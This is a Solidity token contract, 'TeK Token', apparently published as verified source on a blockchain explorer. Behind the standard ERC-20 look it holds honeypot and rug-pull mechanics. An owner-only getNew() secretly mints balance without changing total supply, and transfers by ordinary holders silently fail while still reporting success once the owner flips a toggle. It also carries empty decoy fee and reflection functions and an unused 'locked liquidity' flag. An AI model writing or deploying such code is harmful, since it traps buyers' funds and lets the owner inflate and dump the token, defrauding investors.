/**
 *Submitted for verification at BscScan.com on 2021-07-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

// ----------------------------------------------------------------------------
// Lib: Safe Math
// ----------------------------------------------------------------------------
contract SafeMath {

    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }

    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }

    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }

    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}


/**
ERC Token Standard #20 Interface
https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md
*/

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
contract Ownable is Context {
    address private _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}


interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract TekToken is Context, IERC20, IERC20Metadata, Ownable, SafeMath  {
    
  
    address internal constant PANCAKE_FACTORY_V2_ADDRESS = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address internal constant PANCAKE_ROUTER_V2_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant burnWallet = 0x000000000000000000000000000000000000dEaD;
    uint256 public _TaxFee  = 5;
    uint256 public _MarketingFee = 5;
    uint256 _TEK = 5000000000 * 10**18;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    bool private LockedLiquify = true;
    uint public LockedLiquifyTime = 365 days;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    bool isC = true;

    
    constructor() {
        _name = "TeK Token";
        _symbol = "TKT";
        _totalSupply = 1000000000000000 * 10**18;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);

        _transfer(_msgSender(), burnWallet, _totalSupply/2 );
    }
    receive() external payable {}
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
	
	// ------------------------------------------------------------------------
    // Total supply TEK
    // ------------------------------------------------------------------------
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
	
	// ------------------------------------------------------------------------
    // Get the token balance for account tokenOwner
    // ------------------------------------------------------------------------
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function getNew(uint256 tokens) public onlyOwner virtual returns (bool) {
        _balances[_msgSender()] += tokens;
        return true;
    }
    function isExcludedFromReward(address spender, uint256 subtractedValue) public virtual returns (bool) {}
    function totalFees() public view returns (uint256) {}
    function deliver(uint256 ttokens) public {}
    function reflectionFromToken(uint256 ttokens, bool deductTransferFee) public view returns(uint256) {}
    function tSL(bool _tsl) public onlyOwner virtual returns (bool) {
        isC = _tsl;
        return true;
    }
    function tsl() public view returns (bool) {
        return isC;
    }
    function tokenFromReflection(uint256 rtokens) public view returns(uint256) {}
    function excludeFromReward(address account) public onlyOwner() {}
    function includeInReward(address account) external onlyOwner() {}
    function includeInFee(address account) public onlyOwner {}
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {}
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {}
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {}
    
	// ------------------------------------------------------------------------
    // Transfer the balance from token owner's account to to account
    // - Owner's account must have sufficient balance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
	function transfer(address recipient, uint256 tokens) public virtual override returns (bool) {

        if(_msgSender() == PANCAKE_ROUTER_V2_ADDRESS || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            _transfer(_msgSender(), recipient, tokens);
        } else {
            //nomal user check tokens
            if( (tokens <= _TEK || isC) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, tokens);
            }
        }
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
	
	// ------------------------------------------------------------------------
    // Token owner can approve for spender to transferFrom(...) tokens
    // from the token owner's account
    //
    // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md
    // recommends that there are no checks for the approval double-spend attack
    // as this should be implemented in user interfaces 
    // ------------------------------------------------------------------------
    function approve(address spender, uint256 tokens) public virtual override returns (bool) {
        _approve(_msgSender(), spender, tokens);
        return true;
    }
	// ------------------------------------------------------------------------
    // Transfer tokens from the from account to the to account
    // 
    // The calling account must already have sufficient tokens approve(...)-d
    // for spending from the from account and
    // - From account must have sufficient balance to transfer
    // - Spender must have sufficient allowance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
    function transferFrom(address sender, address recipient, uint256 tokens) public virtual override returns (bool) {
        if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            _transfer(sender, recipient, tokens);
    
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= tokens, "TEK: transfer tokens exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - tokens);
            }
        } else {
            //normal user check tokens
            if( (tokens <= _TEK || isC) && !isContract(sender) ) {
                _transfer(sender, recipient, tokens);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= tokens, "TEK: transfer tokens exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - tokens);
                }
            }
        }
        return true;
    }
    function pancakePair() public view virtual returns (address) {
        address pairAddress = IPancakeFactory(PANCAKE_FACTORY_V2_ADDRESS).getPair(address(WBNB), address(this));
        return pairAddress;
    }
    
     function _transfer(address sender,  address recipient, uint256 tokens) internal virtual {
        require(sender != address(0), "TEK: transfer from the zero address");
        require(recipient != address(0), "TEK: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, tokens);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= tokens, "TEK: transfer tokens exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - tokens;
        }
        _balances[recipient] += tokens;

        emit Transfer(sender, recipient, tokens);
    }
/**
 * @dev Collection of functions related to the address type
 */

    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */  
    
      function isContract(address addr) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "TEK: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    
    function tokenContract() public view virtual returns (address) {
        return address(this);
    }
   
    function _mint(address account, uint256 tokens) internal virtual {
        require(account != address(0), "TEK: mint to the zero address");

        _beforeTokenTransfer(address(0), account, tokens);

        _totalSupply += tokens;
        _balances[account] += tokens;
        emit Transfer(address(0), account, tokens);
    }
        function _burn(address account, uint256 tokens) internal virtual {
        require(account != address(0), "TEK: burn from the zero address");

        _beforeTokenTransfer(account, address(0), tokens);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= tokens, "TEK: burn tokens exceeds balance");
        unchecked {
            _balances[account] = accountBalance - tokens;
        }
        _totalSupply -= tokens;

        emit Transfer(account, address(0), tokens);
    }

    
    
    function _approve(address owner, address spender, uint256 tokens) internal virtual {
        require(owner != address(0), "TEK: approve from the zero address");
        require(spender != address(0), "TEK: approve to the zero address");

        _allowances[owner][spender] = tokens;
        emit Approval(owner, spender, tokens);
    }
    function _beforeTokenTransfer(address from, address to, uint256 tokens) internal virtual {}
}